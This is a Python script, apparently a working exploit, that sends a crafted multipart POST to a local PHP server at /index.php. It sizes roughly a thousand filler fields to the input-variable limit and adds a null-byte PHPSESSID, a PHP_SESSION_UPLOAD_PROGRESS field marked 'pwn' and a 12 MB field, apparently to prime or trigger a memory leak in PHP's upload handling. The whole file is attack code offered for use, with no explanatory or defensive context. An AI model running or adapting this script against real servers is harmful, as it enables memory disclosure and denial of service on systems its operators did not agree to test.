#!/usr/bin/env python3
"""Leak prime: NL-char filler names, E pre-warning 39-char-value fields.

usage: send_a_leak5.py E NL BNDLEN FILE_NAME_LEN FILENAME_LEN HUGE_MB
"""
import socket,sys
E=int(sys.argv[1]); NL=int(sys.argv[2]) if len(sys.argv)>2 else 5
BNL=int(sys.argv[3]) if len(sys.argv)>3 else 17
FNL=int(sys.argv[4]) if len(sys.argv)>4 else 1
FNLEN=int(sys.argv[5]) if len(sys.argv)>5 else 5
HUGE=int(sys.argv[6]) if len(sys.argv)>6 else 12
NF=1001-2-E
BND=b'S'*BNL
parts=[]
for i in range(NF):
    nm=('f%0*d'%(max(0,NL-1),i))[:NL] if NL>0 else 'f'
    parts.append({'name':nm,'data':b'x'})
for i in range(E):
    nm=('e%0*d'%(max(0,NL-1),i))[:NL] if NL>0 else 'e'
    parts.append({'name':nm,'data':b'E'*39})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'F'*FNL,'filename':'G'*FNLEN,'data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
